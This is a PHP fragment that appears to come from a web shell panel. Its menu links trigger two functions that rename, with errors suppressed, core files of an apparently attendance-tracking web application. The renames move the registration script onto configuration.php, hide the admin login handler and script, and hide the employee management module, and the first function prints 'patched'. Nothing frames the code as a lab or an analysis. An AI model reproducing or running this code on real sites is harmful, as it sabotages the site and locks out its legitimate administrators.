...
<a href="?path=<?php swidodo();?>"><span>[</span> swidodo <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
<a href="?path=<?php absen();?>"><span>[</span> absen <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
...
function swidodo() {
  @rename("../../sw-mod/registrasi.php", "../../sw-mod/configuration.php");
  @rename("../../sw-mod/profile.php", "../../sw-mod/_profile.php");
  @rename("../../sw-admin/login/jquery-login.js", "../../sw-admin/login/.jquery-login.js");
  @rename("../../sw-admin/login/login-proses.php", "../../sw-admin/login/_login-proses.php");
  @rename("../../sw-admin/sw-mod/karyawan", "../../sw-admin/sw-mod/_karyawan");
  @rename("../../sw-admin/sw-mod/_karyawan/karyawan.php", "../../sw-admin/sw-mod/_karyawan/_karyawan.php");
  echo "patched";
}
function absen(){
  @rename("../../mod/registrasi.php", "../../mod/configuration.php");
  @rename("../../mod/profile.php", "../../mod/_profile.php");
  @rename("../../admin/login/jquery-login.js", "../../admin/login/.jquery-login.js");
  @rename("../../admin/login/login-proses.php", "../../admin/login/_login-proses.php");
  @rename("../../admin/mod/karyawan", "../../admin/mod/_karyawan");
  @rename("../../admin/mod/_karyawan/karyawan.php", "../../admin/mod/_karyawan/_karyawan.php");
}
